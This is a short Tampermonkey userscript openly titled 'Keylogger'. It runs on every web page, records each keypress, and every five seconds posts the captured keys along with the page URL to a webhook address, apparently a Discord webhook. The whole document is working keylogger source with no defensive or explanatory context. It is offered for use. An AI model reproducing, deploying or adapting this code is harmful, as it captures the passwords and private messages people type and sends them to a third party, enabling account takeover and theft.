// ==UserScript==
// @name Keylogger
// @namespace http://tampermonkey.net/
// @version 1.0
// @description A simple Keylogger for Tampermonkey. (Browser Extionsion)
// @author Lyzev
// @include http://*
// @include https://*
// @run-at document-start
// @grant none
// ==/UserScript==
(function() {
    let webhook = "WEBHOOK-URL"
    let delay = 5000 // in Milliseconds
    let data = []
    document.onkeypress = function(e) {
        data.push(e.key)
    }
    let intervall = setInterval(function() {
        if (data.length == 0)
            return
        const request = new XMLHttpRequest()
        request.open("POST", webhook)
        request.setRequestHeader('Content-type', 'application/json')
        const params = {
            username: "KeyLogger",
            avatar_url: "https://signal.avg.com/hubfs/Blog_Content/Avg/Signal/AVG%20Signal%20Images/Keyloggers%20What%20They%20Are/What_is_a_Keylogger-Thumb.jpg",
            content: "**URL**: `" + document.URL + "`\n" + JSON.stringify(data)
        }
        request.send(JSON.stringify(params))
        data = []
    }, delay)
    window.unload = function() {
        clearInterval(intervall)
    }
})();